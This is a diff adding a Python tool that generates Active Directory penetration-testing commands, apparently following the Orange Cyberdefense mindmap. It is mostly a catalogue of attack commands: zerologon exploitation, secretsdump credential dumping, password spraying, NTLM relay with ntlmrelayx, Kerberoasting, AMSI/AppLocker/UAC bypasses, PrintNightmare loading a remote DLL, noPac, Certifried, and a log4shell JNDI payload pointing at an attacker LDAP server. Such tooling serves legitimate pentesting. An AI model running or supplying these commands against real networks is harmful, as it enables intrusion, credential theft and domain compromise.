@@ -1,0 +1,1262 @@
+#!/usr/bin/python3
+"""
+Interactive command generator for https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg
+"""
+
+# by wildcard name
+# by block 
+# by service
+# by port (winrm)
+# by tool
+# by tags
+
+# use tags
+# show following paths
+
+import readline
+import sys
+from pprint import pprint
+import pdb
+import os
+
+class Hint:
+    mode = 'verbose'
+    known_modes = ('command', 'verbose')
+    match_conditions = {
+        'name': lambda lvalue, hint: lvalue in hint.name.lower(),
+        'command': lambda lvalue, hint: lvalue in hint.command.lower(),
+        'block': lambda lvalue, hint: lvalue in hint.block.lower(),
+        'service': lambda lvalue, hint: lvalue == hint.service.lower(),
+        'ports': lambda lvalue, hint: lvalue in hint.ports,
+        'tool': lambda lvalue, hint: lvalue == hint.tool.lower(),
+        #'tags': lambda lvalue, hint: lvalue in [x.lower() for x in hint.tags],
+        'tags': lambda lvalue, hint: any([lvalue in x.lower() for x in hint.tags]),
+        'comment': lambda lvalue, hint: lvalue in hint.comment.lower(),
+        'next_step': lambda lvalue, hint: lvalue in hint.next_step.lower(),
+    }
+
+    def add_known(command, values):
+        for k,v in values.items():
+            if v:
+                command = command.replace('{'+k+'}', v)
+        return command
+
+    def __init__(self, name, command, block, service, ports, tool, tags='', comment='', next_step=''):
+        self.name = name or ''
+        self.command = command or ''
+        self.block = block
+        self.service = service or ''
+        self.ports = str(ports or '').split(' ')
+        self.tool = tool or ''
+        self.tags = list(filter(None, (tags or '').split(' ')))
+        self.comment = comment or ''
+        self.next_step = next_step or ''
+
+    def matches(self, values, strict_match=None):
+        #if self.name == 'MS14-068':
+        #    pdb.set_trace()
+
+        if 'all' in values:
+            return True
+
+        current_conditions = [v for k,v in Hint.match_conditions.items() if (not strict_match or k == strict_match)]
+
+        for value in values:
+            match = False
+            lvalue = value.lower()
+
+            if not any([cc(lvalue, self) for cc in current_conditions]):
+                return False
+        return True
+
+    def __str__(self):
+        global intel, formatting
+
+        command = Hint.add_known(self.command, intel)
+        if not command.strip():
+            command = '-'
+        if Hint.mode == 'command':
+            return command
+
+        else: # verbose
+            result = ''
+            if formatting.get('last_block') != self.block:
+                result += f'\n\033[33m[{self.block}]\033[0m\n'
+            if formatting.get('last_name') != self.name:
+                result += f'\n\033[32m{self.name}:\033[0m\n'
+
+            #comment_nextstep = self.comment if self.comment else ""
+            comment_nextstep = ""
+            if self.next_step:
+                comment_nextstep += f" -> {self.next_step}"
+            if comment_nextstep:
+                comment_nextstep += ';'
+
+            ports = '/'.join(self.ports)
+            service_ports = ', '.join(filter(None, [self.service, ports or None]))
+            if service_ports:
+                service_ports = f'({service_ports}),'
+
+            tags = []
+            for tag in self.tags:
+                if tag == 'dangerous':
+                    tags.append(f'\033[31m{tag}\033[94m')
+                else:
+                    tags.append(tag)
+            if self.tool and self.tool not in tags:
+                tags.insert(0, f'\033[92m{self.tool}\033[94m')
+            tags = f'[{", ".join(tags)}]'
+
+            if len(command) < 80 and False:
+                result += f"  {command.ljust(80)}   \033[94m# {comment_nextstep} {service_ports} {tags}\033[0m"
+            else: 
+                #result += f"  \033[94m# {comment_nextstep} {service_ports} {tags}\033[0m\n  {command}"
+                result += f"  \033[94m# {comment_nextstep} {service_ports} {tags}\033[0m\n"
+                if self.comment:
+                    result += f'  \033[94m# {self.comment}\033[0m\n'
+                result += f"  {command}\n"
+            
+            formatting['last_block'] = self.block
+            formatting['last_name'] = self.name
+            return result
+
+hints = [
+    
+    # No credentials
+    
+    Hint(name='Scan network', command='cme smb {subnet}', block='no credentials', service='SMB', ports='445', 
+        tool='crackmapexec', tags='', comment='enumerate smb hosts', next_step=''),
+    Hint(name='Scan network', command='nmap -sP -p {ip}', block='no credentials', service='ICMP', ports=None, 
+        tool='nmap', tags='', comment='ping scan', next_step='find vulnerable host'),
+    Hint(name='Scan network', command='nmap -PN -sV --top-ports 50 --open {ip}', block='no credentials', service=None, ports=None, 
+        tool='nmap', tags='', comment='quick scan', next_step='find vulnerable host'),
+    Hint(name='Scan network', command='nmap -PN --script smb-vuln* -p139,445 {ip}', block='no credentials', service='SMB', ports='139 445', 
+        tool='nmap', tags='', comment='search smb vuln', next_step='find vulnerable host'),
+    Hint(name='Scan network', command='nmap -PN -sC -sV -oA {output} {ip}', block='no credentials', service=None, ports=None, 
+        tool='nmap', tags='', comment='classic scan', next_step='find vulnerable host'),
+    Hint(name='Scan network', command='nmap -PN -sC -sV -p- -oA {output} {ip}', block='no credentials', service=None, ports=None, 
+        tool='nmap', tags='', comment='full scan', next_step='find vulnerable host'),
+    Hint(name='Scan network', command='nmap -PN -sU -sC -sV -p- -oA {output} {ip}', block='no credentials', service=None, ports=None, 
+        tool='nmap', tags='UDP', comment='UDP scan', next_step='find vulnerable host'),
+
+    Hint(name='Find DC IP', command='nmcli dev show {interface}', block='no credentials', service=None, ports=None, 
+        tool=None, tags='', comment='show domain name & DNS', next_step=None),
+    Hint(name='Find DC IP', command='nslookup -type=SRV _ldap._tcp.dc._msdcs.{domain}', block='no credentials', service='DNS', ports=53, 
+        tool='nslookup', tags='', comment='', next_step=None),
+
+    Hint(name='zone transfer', command='dig axfr {domain} @{ip}', block='no credentials', service='DNS', ports=53, 
+        tool='dig', tags='', comment='', next_step=None), # originally @{name_server}
+
+    Hint(name='List null session access on smb share', command='enum4linux -a -u "" -p "" {ip}', block='no credentials', service='SMB', ports=445, 
+        tool='enum4linux', tags='', comment='', next_step=None),
+    Hint(name='List null session access on smb share', command='smbmap -u "" -p "" -P 445 -H {ip}', block='no credentials', service='SMB', ports=445, 
+        tool='smbmap', tags='', comment='', next_step=None),
+    Hint(name='List null session access on smb share', command='smbclient -U "%" -L //{ip}', block='no credentials', service='SMB', ports=445, 
+        tool='smbclient', tags='', comment='', next_step=None),
+    Hint(name='List null session access on smb share', command='cme smb {ip} -u "" -p ""', block='no credentials', service='SMB', ports=445, 
+        tool='crackmapexec', tags='', comment='enumerate null session', next_step=None),
+    Hint(name='List guest access on smb share', command='enum4linux -a -u "guest" -p "" {ip}', block='no credentials', service='SMB', ports=445, 
+        tool='enum4linux', tags='', comment='', next_step=None),
+    Hint(name='List guest access on smb share', command='smbmap -u "guest" -p "" -P 445 -H {ip}', block='no credentials', service='SMB', ports=445, 
+        tool='smbmap', tags='', comment='', next_step=None),
+    Hint(name='List guest access on smb share', command='smbclient -U "guest" -L //{ip}', block='no credentials', service='SMB', ports=445, 
+        tool='smbclient', tags='', comment='', next_step=None),
+    Hint(name='List guest access on smb share', command='cme smb {ip} -u "guest" -p ""', block='no credentials', service='SMB', ports=445, 
+        tool='crackmapexec', tags='', comment='enumerate anonymous access', next_step=None),
+
+    Hint(name='Enumerate LDAP', command='nmap -n -sV --script "ldap* and not brute" -p 389,636,3268,3269 {ip}', block='no credentials', service='LDAP', ports='389 636 3268 3269', 
+        tool='nmap', tags='', comment='', next_step='got username'),
+    Hint(name='Enumerate LDAP', command='ldapsearch -x -H ldap://{ip} -s base', block='no credentials', service='LDAP', ports='389 636 3268 3269', 
+        tool='ldapsearch', tags='', comment='', next_step='got username'),
+
+    Hint(name='Enumerate RPC', command='rpcclient -U "" -N {ip} -c "enumdomusers; enumdomgroups; getdompwinfo; querydispinfo"', block='no credentials', service='RPC', ports='135', 
+        tool='rpcclient', tags='', comment='', next_step='got username'),
+
+    Hint(name='Find user list', command='enum4linux -U {ip} | grep "user"', block='no credentials', service=None, ports=None,
+        tool='enum4linux', tags='', comment='', next_step='got username'),
+    Hint(name='Find user list', command='cme smb {ip} --users', block='no credentials', service=None, ports=None,
+        tool='crackmapexec', tags='', comment='', next_step='got username'),
+    Hint(name='Find user list', command='net rpc group members "Domain Users" -W "{domain}" -I "{ip}" -U "%"', block='no credentials', service=None, ports=None,
+        tool='net', tags='', comment='', next_step='got username'),
+    Hint(name='Find user list', command='OSINT - enumerate username on internet', block='no credentials', service=None, ports=None,
+        tool=None, tags='', comment='', next_step='got username'),
+    Hint(name='Find user list', command='nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-user.realm=\'{domain}\',userdb={users_dict}" {ip}', block='no credentials', 
+        service='Kerberos', ports=88, tool='nmap', tags='', comment='', next_step='got username'),
+    Hint(name='Find user list', command='windapsearch.py -d {domain} --dc-ip {ip} -U --full', block='no credentials', 
+        service='LDAP', ports='389 636 3268 3269', tool='windapsearch', tags='', comment='', next_step='got username'),
+    Hint(name='Find user list', command='rpcclient -U "" -N {ip} -c "enumdomusers; querydispinfo"', block='no credentials', service='RPC', ports='135', 
+        tool='rpcclient', tags='', comment='', next_step='got username'),
+
+    Hint(name='Poisoning', command='Responder -I {interface}', block='no credentials', service='LLMNR/Netbios/mDNS', ports='5355 137 138 139 5353',
+        tool='Responder', tags='hot', comment='LLMNR/NBTNS/MDNS, use --lm to force lm downgrade, disable smb & http if relay', next_step='mitm (Poisoning SMB/HTTP)'),
+    Hint(name='Poisoning', command='mitm6 -d {domain}', block='no credentials', service='IPv6', ports=None,
+        tool='mitm6', tags='', comment='IPv6 prefered to IPv4', next_step='mitm (Poisoning SMB/HTTP)'),
+    Hint(name='Poisoning', command='bettercap', block='no credentials', service='ARP', ports=None,
+        tool='bettercap', tags='', comment='ARP Poisoning', next_step='mitm (Poisoning SMB/HTTP)'),
+
+    Hint(name='Coerce', command='PetitPotam.py -d {domain} {listener_ip} {ip}', block='no credentials', service='DCERPC', ports=135,
+        tool='PetitPotam', tags='CVE', comment='CVE-2022-26925', next_step='mitm (Coerce SMB)'),
+
+    # Classic quick compromission methods
+
+    Hint(name='zerologon', command='zerologon-scan "{dc_netbios_name}" "{ip}"', block='classic quick compromission methods', service='Netlogon', ports=None,
+        tool='zerologon-scan', tags='CVE', comment='unsafe, CVE-2020-1472', next_step='Admin/Domain Admin'),
+    Hint(name='zerologon', command='python3 cve-2020-1472-exploit.py {dc_netbios_name} {ip}', block='classic quick compromission methods', service='Netlogon', ports=None,
+        tool='cve-2020-1472-exploit.py', tags='dangerous CVE', comment='unsafe, CVE-2020-1472', next_step='Admin/Domain Admin'),
+    Hint(name='zerologon', command=r'secretsdump.py {domain}/{dc_netbios_name}\$@{ip} -no-pass -just-dc-user "Administrator"', block='classic quick compromission methods', service='Netlogon', ports=None,
+        tool='secretsdump', tags='dangerous CVE', comment='unsafe, CVE-2020-1472', next_step='Admin/Domain Admin'),
+    Hint(name='zerologon', command='secretsdump.py -hashes :{hash} {domain}/Administrator@{ip}', block='classic quick compromission methods', service='Netlogon', ports=None,
+        tool='secretsdump', tags='dangerous CVE', comment='unsafe, CVE-2020-1472', next_step='Admin/Domain Admin'),
+    Hint(name='zerologon', command='python3 restorepassword.py -target-ip {ip} {domain}/{dc_netbios_name}@{dc_netbios_name} -hexpass {hexpass}', block='classic quick compromission methods', service='Netlogon', ports=None,
+        tool='restorepassword.py', tags='CVE', comment='unsafe, CVE-2020-1472', next_step='Admin/Domain Admin'),
+
+    Hint(name='Eternal Blue', command='exploit/windows/smb/ms17_010_eternalblue', block='classic quick compromission methods', service='SMB', ports='445',
+        tool='metasploit', tags='CVE', comment='MS17-010, CVE-2017-0144', next_step='Admin/Domain Admin'),
+
+    Hint(name='SYSVOL & GPP', command='scanner/smb/smb_enum_gpp', block='classic quick compromission methods', service='SMB', ports='445',
+        tool='metasploit', tags='CVE', comment='MS14-025', next_step='Admin/Domain Admin'),
+    Hint(name='SYSVOL & GPP', command=r'findstr /S -I cpassword \\{fqdn}\sysvol\{fqdn}\policies\*.xml', block='classic quick compromission methods', service='SMB', ports='445',
+        tool='shell', tags='CVE Windows', comment='MS14-025 CVE-2014-1812', next_step='Admin/Domain Admin'),
+
+    Hint(name='tomcat/jboss manager', command='auxiliary/scanner/http/tomcat_enum', block='classic quick compromission methods', service='Tomcat', ports=None,
+        tool='metasploit', tags=None, comment=None, next_step='Admin/Domain Admin/Low Access'),
+    Hint(name='tomcat/jboss manager', command='exploit/multi/http/tomcat_mgr_deploy', block='classic quick compromission methods', service='Tomcat', ports=None,
+        tool='metasploit', tags=None, comment=None, next_step='Admin/Domain Admin/Low Access'),
+
+    Hint(name='java rmi', command='exploit/multi/misc/java_rmi_server', block='classic quick compromission methods', service=None, ports=None,
+        tool='metasploit', tags=None, comment=None, next_step='Admin/Domain Admin/Low Access'),
+
+    Hint(name='java serialized port', command='ysoserial', block='classic quick compromission methods', service=None, ports=None,
+        tool='ysoserial', tags=None, comment=None, next_step='Admin/Domain Admin/Low Access'),
+
+    Hint(name='vulnerable product', command='searchsploit', block='classic quick compromission methods', service=None, ports=None,
+        tool='searchsploit', tags=None, comment=None, next_step='Admin/Domain Admin/Low Access'),
+
+    Hint(name='proxylogon', command=None, block='classic quick compromission methods', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step='Admin/Domain Admin/Low Access'),
+
+    Hint(name='proxyshell', command=None, block='classic quick compromission methods', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step='Admin/Domain Admin/Low Access'),
+
+    Hint(name='log4shell', command=r'$\{jndi:ldap://{ip}:{port}/o=reference\}', block='classic quick compromission methods', service=None, ports=None,
+        tool='rogueJndi-1.0.jar', tags=None, comment=None, next_step='Admin/Domain Admin/Low Access'),
+
+    Hint(name='database credentials', command='admin/mssql/mssql_enum_sql_logins', block='classic quick compromission methods', service='MSSQL', ports='1433',
+        tool='metasploit', tags=None, comment=None, next_step='MSSQL connection'),
+    
+    # Got username
+
+    Hint(name='get password policy', command='cme smb {ip} -u "{user}" -p \'{password}\' --pass-pol', block='got username', service=None, ports=None,
+        tool='crackmapexec', tags='hot', comment=None, next_step=None),
+    Hint(name='get password policy', command='enum4linux -u "{user}" -p \'{password}\' -P {ip}', block='got username', service=None, ports=None,
+        tool='enum4linux', tags='hot', comment=None, next_step=None),
+    Hint(name='get password policy', command='Get-ADDefaultDomainPasswordPolicy', block='got username', service=None, ports=None,
+        tool='powershell', tags='hot Windows', comment=None, next_step=None),
+    Hint(name='get password policy', command='Get-ADUserResultantPasswordPolicy -Identity {user}', block='got username', service=None, ports=None,
+        tool='powershell', tags='hot Windows', comment='FGPP', next_step=None),
+    Hint(name='get password policy', command='ldapsearch-ad.py --server "{ip}" -d {domain} -u {user} -p {password} --type pass-pols', block='got username', service='LDAP', ports='389 636 3268 3269',
+        tool='ldapsearch-ad', tags='hot Windows', comment='FGPP', next_step=None),
+
+    Hint(name='Test user list', command='impacket-GetNPUsers {domain}/ -dc-ip {ip} -usersfile {users_dict} -format hashcat -outputfile output/asrep', block='got username', service='Kerberos', ports=88,
+        tool='impacket', tags=None, comment='also get ASREP hash for ASREPRoast', next_step='cracking ASREP'),
+    Hint(name='Password spray', command='cme smb {ip} -u {users_dict} -p {passwords_dict} --no-bruteforce', block='got username', service='SMB', ports='445',
+        tool='crackmapexec', tags='hot', comment=None, next_step='valid credentials'),
+    Hint(name='Password spray', command='cme smb {ip} -u {users_dict} -p {passwords_dict} --continue-on-success', block='got username', service='SMB', ports='445',
+        tool='crackmapexec', tags='hot dangerous', comment='danger of locking', next_step='valid credentials'),
+    Hint(name='Password spray', command='sprayhound -U {users_dict} -d {domain} -dc {ip}', block='got username', service=None, ports=None,
+        tool='sprayhound', tags='hot LDAP', comment=None, next_step='valid credentials'),
+    Hint(name='Password spray', command='while read -r u; do while read -r p; do ldapwhoami -x -D "$u@{domain}" -w "$p" -H ldap://{ip} && echo "Valid: $u:$p" && break; done < {passwords_dict}; done < {users_dict}', block='got username', service=None, ports=None,
+        tool='ldapwhoami', tags='LDAP', comment=None, next_step='valid credentials'),
+    
+    Hint(name='Get ASREPRoastable users', command='Get-DomainUser -PreauthNotRequired -Properties SamAccountName', block='got username', service=None, ports=None,
+        tool='PowerView', tags=None, comment='ASREPRoast', next_step='cracking ASREP'),
+    Hint(name='Get ASREPRoastable users', command='MATCH (u:User {dontreqpreauth:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p', block='got username', service=None, ports=None,
+        tool='Bloodhound', tags=None, comment='ASREPRoast', next_step='cracking ASREP'),
+
+    Hint(name='Get ASREP hash', command='impacket-GetNPUsers {domain}/ -dc-ip {ip} -usersfile {users_dict} -format hashcat -outputfile output/asrep', block='got username', service='Kerberos', ports=88,
+        tool='impacket', tags=None, comment='ASREPRoast', next_step='cracking ASREP'),
+    Hint(name='Get ASREP hash', command='Rubeus.exe asreproast /format:hashcat', block='got username', service='Kerberos', ports=88,
+        tool='Rubeus', tags='Windows', comment='ASREPRoast', next_step='cracking ASREP'),
+
+    Hint(name='Blind Kerberoasting', command='Rubeus.exe kerberoast /domain:{domain} /dc:{ip} /nopreauth: {asrep_user} /spns:{users_dict}', block='got username', service='Kerberos', ports=88,
+        tool='Rubeus', tags='Windows', comment='ASREPRoast', next_step='cracking TGS'),
+    Hint(name='Blind Kerberoasting', command='impacket-GetUserSPNs -no-preauth "{asrep_user}" -usersfile "{users_dict}" -dc-host "{ip}" "{domain}"/', block='got username', service='Kerberos', ports=88,
+        tool='impacket', tags=None, comment='ASREPRoast', next_step='cracking TGS'),
+
+    Hint(name='CVE-2022-33679', command='python3 CVE-2022-33679.py {domain}/{user} {ip}', block='got username', service='Kerberos', ports='88',
+        tool=None, tags='CVE', comment='CVE-2022-33679', next_step='lateral move (PTT)'),
+
+    # MitM
+
+    Hint(name='listen', command='Responder -I eth0', block='mitm', service=None, ports=None,
+        tool='Responder', tags='hot', comment='user --lm to force lm downgrade', next_step='cracking NetNTLMv1, cracking NetNTLMv2, got username'),
+    Hint(name='listen', command='impacket-smbclient ', block='mitm', service='SMB', ports='445',
+        tool='impacket', tags=None, comment=None, next_step='cracking NetNTLMv1, cracking NetNTLMv2, got username'),
+
+    Hint(name='relay on itself', command='exploit/windows/smb/smb_relay', block='mitm', service='SMB', ports='445',
+        tool='metasploit', tags=None, comment='MS08-068 Windows200 / Windows Server 2008', next_step='administrator access'),
+    Hint(name='remove mic', command=None, block='mitm', service='SMB', ports='445',
+        tool=None, tags='CVE NetNTLMv1 NetNTLMv2', comment='CVE-2019-1040, SMB -> LDAP', next_step='relay to LDAP'),
+
+    Hint(name='relay to LDAP', command='impacket-ntlmrelayx --remove-mic --escalate-user {user} -t ldap://{ip} -smb2support', block='mitm', service='LDAP', ports='389 636 3268 3269',
+        tool='impacket', tags=None, comment='SMB -> LDAP, HTTP -> LDAP', next_step='permissions (DCSync)'),
+    Hint(name='relay to LDAP', command='impacket-ntlmrelayx -t ldaps://{ip} --remove-mic --add-computer {computer_name} {password} --delegate-access -smb2support', block='mitm', service='LDAP', ports='389 636 3268 3269',
+        tool='impacket', tags=None, comment='SMB -> LDAP, HTTP -> LDAP', next_step='RBCD'),
+    Hint(name='relay to LDAP', command='impacket-ntlmrelayx -t ldap://{ip} --shadow-credentials --shadow-target "{ip}"', block='mitm', service='LDAP', ports='389 636 3268 3269',
+        tool='impacket', tags=None, comment='SMB -> LDAP, HTTP -> LDAP', next_step='shadow credentials'),
+    Hint(name='relay to LDAP', command='impacket-ntlmrelayx -wh {attacker_ip} -t ldap://{ip} -l /tmp -6 -debug', block='mitm', service='LDAP', ports='389 636 3268 3269',
+        tool='impacket', tags=None, comment='SMB -> LDAP, HTTP -> LDAP', next_step='got username'),
+
+    Hint(name='find unsigned SMB', command='nmap -Pn -sS -T4 --open --script smb-security-mode -p 445 {subnet}', block='mitm', service='SMB', ports='445',
+        tool='nmap', tags=None, comment='-> SMB', next_step=None),
+    Hint(name='find unsigned SMB', command='exploit/windows/smb/smb_relay', block='mitm', service='SMB', ports='445',
+        tool='metasploit', tags=None, comment='-> SMB', next_step=None),
+    Hint(name='find unsigned SMB', command='cme smb {subnet} --gen-relay-list {relay_list}', block='mitm', service='SMB', ports='445',
+        tool='crackmapexec', tags=None, comment='-> SMB', next_step=None),
+
+    Hint(name='unsigned SMB', command='impacket-ntlmrelayx -tf {target_list} -smb2support --enum-domain', block='mitm', service='SMB', ports='445',
+        tool='impacket', tags=None, comment='-> SMB', next_step='got username'),
+    Hint(name='unsigned SMB', command='impacket-ntlmrelayx -tf {target_list} -smb2support -socks', block='mitm', service='SMB', ports='445',
+        tool='impacket', tags='hot', comment='-> SMB', next_step='lateral move (SOCKS)'),
+
+    Hint(name='http ADCS web', command='impacket-ntlmrelayx -tf {target_list} -smb2support -socks', block='mitm', service=None, ports=None,
+        tool=None, tags=None, comment='-> HTTP', next_step='ESC8'),
+
+    Hint(name='sccm ntlm relay attack', command='impacket-ntlmrelayx -tf {target_list} -smb2support -socks', block='mitm', service=None, ports=None,
+        tool=None, tags=None, comment='-> HTTP', next_step=None),
+
+    Hint(name='relay to MSSQL', command='impacket-ntlmrelayx -t mssql://{ip} -smb2support -socks', block='mitm', service='MSSQL', ports='1433',
+        tool='impacket', tags=None, comment='-> MSSQL', next_step='lateral move (SOCKS)'),
+
+    Hint(name='zerologon', command='impacket-ntlmrelayx -t dcsync://{ip} -smb2support -auth-smb {user}:{password}', block='mitm', service='Netlogon', ports=None,
+        tool='impacket', tags='CVE', comment='safe, CVE-2020-1472, corce come from dc01 & relay to dc02', next_step='permissions (DCSync)'),
+
+    Hint(name='ARP poisoning', command='pywsus.py', block='mitm', service='ARP', ports=None,
+        tool=None, tags=None, comment=None, next_step=None),
+
+    # Privilege escalation
+
+    Hint(name='Get Applocker info', command=r'Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe', block='privilege escalation', service=None, ports=None,
+        tool='powershell', tags='Windows', comment='dll/msi/...', next_step=None),
+
+    Hint(name='winpeas', command='winpeas.exe', block='privilege escalation', service=None, ports=None,
+        tool='winpeas', tags='Windows', comment=None, next_step=None),
+
+    Hint(name='AMSI bypass', command='https://amsi.fail', block='privilege escalation', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step=None),
+    Hint(name='AMSI bypass', command='Reflection method', block='privilege escalation', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step=None),
+    Hint(name='AMSI bypass', command='Patching amsi.dll', block='privilege escalation', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step=None),
+
+    Hint(name='search password files', command='findstr /si "password" *.txt *.xml *.docx', block='privilege escalation', service=None, ports=None,
+        tool='shell', tags=None, comment=None, next_step='valid credentials'),
+
+    Hint(name='AppLocker (whitelisting) bypass', command=r'C:\Windows\Tasks', block='privilege escalation', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step='privilege escalation (without applocker)'),
+    Hint(name='AppLocker (whitelisting) bypass', command=r'C:\Windows\Temp', block='privilege escalation', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step='privilege escalation (without applocker)'),
+    Hint(name='AppLocker (whitelisting) bypass', command=r'installutil.exe /logfile= /LogToConsole=false /U C:\runme.exe', block='privilege escalation', service=None, ports=None,
+        tool=None, tags=None, comment='Powershell CLM bypass', next_step='privilege escalation (without applocker)'),
+    Hint(name='AppLocker (whitelisting) bypass', command='mshta.exe my.hta', block='privilege escalation', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step='privilege escalation (without applocker)'),
+    Hint(name='AppLocker (whitelisting) bypass', command='MSBuild', block='privilege escalation', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step='privilege escalation (without applocker)'),
+
+    Hint(name='User Access Control (UAC) bypass', command='FodHelper', block='privilege escalation', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step='administrator access'),
+    Hint(name='User Access Control (UAC) bypass', command='WSReset', block='privilege escalation', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step='administrator access'),
+    Hint(name='User Access Control (UAC) bypass', command='MSDT', block='privilege escalation', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step='administrator access'),
+
+    Hint(name='SMBGhost', command=None, block='privilege escalation', service='SMB', ports='445',
+        tool=None, tags='CVE', comment='CVE-2020-0796', next_step='administrator access'),
+
+    Hint(name='HiveNightmare/SeriousSAM', command=None, block='privilege escalation', service=None, ports=None,
+        tool=None, tags='CVE', comment='CVE-2021-36934', next_step='administrator access'),
+
+    Hint(name='RoguePotato', command=None, block='privilege escalation', service=None, ports=None,
+        tool=None, tags=None, comment='service account (IIS/MSSQL), got SEImpersonate', next_step='administrator access'),
+    Hint(name='Juicy Potato / Lovely Potato', command=None, block='privilege escalation', service=None, ports=None,
+        tool=None, tags=None, comment='service account (IIS/MSSQL), got SEImpersonate', next_step='administrator access'),
+    Hint(name='PrintSpoofer', command=None, block='privilege escalation', service=None, ports=None,
+        tool=None, tags='hot', comment='service account (IIS/MSSQL), got SEImpersonate', next_step='administrator access'),
+    Hint(name='CertPotato', command='Rubeus tgtdeleg /nowrap', block='privilege escalation', service=None, ports=None,
+        tool='Rubeus', tags=None, comment=None, next_step='administrator access'),
+    Hint(name='CertPotato', command='certipy req -k -ca {ca} -template Machine -target {dc}', block='privilege escalation', service=None, ports=None,
+        tool='certipy', tags=None, comment='TGT (pass the ticket)', next_step='administrator access'),
+    Hint(name='CertPotato', command='certipy auth -pfx {pfx_file}', block='privilege escalation', service=None, ports=None,
+        tool='certipy', tags=None, comment='TGT (pass the ticket)', next_step='administrator access'),
+    Hint(name='CertPotato', command='certipy shadow auto -u "{machine}$"@{domain} -k account "{machine}$"', block='privilege escalation', service=None, ports=None,
+        tool='certipy', tags=None, comment='TGT (pass the ticket), shadow credentials', next_step='administrator access'),
+    Hint(name='CertPotato', command='impacket-ticketer -nthash {hash} -domain-sid {domain_sid} -domain {domain} -spn cifs/{dc} {user}', block='privilege escalation', service=None, ports=None,
+        tool='impacket', tags=None, comment='Machine NT Hash', next_step='administrator access'),
+
+    Hint(name='KrbRelayUp', command=r'.\KrbRelayUp.exe relay -Domain {domain} -CreateNewComputerAccount -ComputerName {computer} -ComputerPassword {password}', block='privilege escalation', service=None, ports=None,
+        tool='KrbRelayUp', tags='hot', comment=None, next_step='administrator access'),
+    Hint(name='KrbRelayUp', command=r'.\KrbRelayUp.exe spawn -m rbcd -d {domain} -dc {dc} -cn {computer_name} -cp {computer_password}', block='privilege escalation', service=None, ports=None,
+        tool='KrbRelayUp', tags='hot', comment=None, next_step='administrator access'),
+
+    # Known vulnerabilities
+
+    Hint(name='MS14-068', command='FindSMB2UPTime.py {ip}', block='known vulnerabilities', service=None, ports=None,
+        tool='FindSMB2UPTime.py', tags='CVE', comment='MS14-068, CVE-2014-6324', next_step='lateral move (Pass the Ticket), administrator access, domain admin'),
+    Hint(name='MS14-068', command='rpcclient $> lookuupnames {name}', block='known vulnerabilities', service=None, ports=None,
+        tool='rpcclient', tags='CVE', comment='MS14-068, CVE-2014-6324', next_step='lateral move (Pass the Ticket), administrator access, domain admin'),
+    Hint(name='MS14-068', command='wmic useraccount get name,sid', block='known vulnerabilities', service=None, ports=None,
+        tool='wmic', tags='CVE', comment='MS14-068, CVE-2014-6324', next_step='lateral move (Pass the Ticket), administrator access, domain admin'),
+    Hint(name='MS14-068', command='auxiliary/admin/kerberos/ms14_068_kerberos_checksum', block='known vulnerabilities', service=None, ports=None,
+        tool='metasploit', tags='CVE', comment='MS14-068, CVE-2014-6324', next_step='lateral move (Pass the Ticket), administrator access, domain admin'),
+    Hint(name='MS14-068', command='impacket-goldenPac -dc-ip {dc_ip} {domain}/{user}:{password}@{dc}', block='known vulnerabilities', service=None, ports=None,
+        tool='impacket', tags='CVE', comment='MS14-068, CVE-2014-6324', next_step='lateral move (Pass the Ticket), administrator access, domain admin'),
+    Hint(name='privexchange', command='python privexchange.py -ah {attacker_ip} {exchange_host} -u {user} -d {domain} -p {password}', block='known vulnerabilities', service=None, ports=None,
+        tool='privexchange.py', tags='CVE', comment='CVE-2019-0724, CVE-2019-0686', next_step='mitm (Coerce HTTP), administrator access, domain admin'),
+    Hint(name='SamAccountName / nopac', command='cme smb {ip} -u {user} -p {password} -M nopac', block='known vulnerabilities', service='SMB', ports='445',
+        tool='crackmapexec', tags='CVE', comment='scan, CVE-2021-42287, CVE-2021-42278', next_step=None),
+    Hint(name='SamAccountName / nopac', command=r'.\noPac.exe -domain {domain} -user {user} -pass {password} /dc {dc_fqdn} /mAccount {machine_account} /mPassword {machine_password} /service cifs /ptt', block='known vulnerabilities', service=None, ports=None,
+        tool='noPac.exe', tags='CVE', comment='CVE-2021-42287, CVE-2021-42278', next_step='lateral move (Pass the ticket), permissions (DCSync), domain admin, delete computer'),
+    Hint(name='SamAccountName / nopac', command='impacket-addcomputer, impacket-addspn, impacket-renamemachine, impacket-getTGT, impacket-renameMachine, impacket-getST', block='known vulnerabilities', service=None, ports=None,
+        tool='impacket', tags='CVE', comment='CVE-2021-42287, CVE-2021-42278', next_step='lateral move (Pass the ticket), permissions (DCSync), domain admin, delete computer'),
+    Hint(name='PrintNightmare', command=r'CVE-2021-1675.py {domain}/{user}:{password}@{ip} "\\{smb_server_ip}\{share}\inject.dll"', block='known vulnerabilities', service=None, ports=None,
+        tool='CVE-2021-1675.py', tags='CVE', comment='CVE-2021-1675, CVE-2021-34527', next_step='administrator access'),
+    Hint(name='Certifried', command='certipy account create -u {user}@{domain} -p \'{password}\' -user "certifriedpc" -pass "certifriedpass" -dns "{dc_fqdn}"', block='known vulnerabilities', service=None, ports=None,
+        tool='certipy', tags='CVE', comment='CVE-2022-26923, needs ADCS', next_step='lateral move (Pass the ticket), permissions (DCSync), domain admin, delete computer'),
+    Hint(name='Certifried', command='certipy req -u "certifriedpc$"@{domain} -p "certifriedpass" -target {fqdn_ca} -ca {ca_name} -template Machine', block='known vulnerabilities', service=None, ports=None,
+        tool='certipy', tags='CVE', comment='CVE-2022-26923, needs ADCS', next_step='lateral move (Pass the ticket), permissions (DCSync), domain admin, delete computer'),
+    Hint(name='Certifried', command='certipy auth -pfx {pfx_file} -username "{dc}$" -domain {domain} -dc-ip {dc_ip}', block='known vulnerabilities', service=None, ports=None,
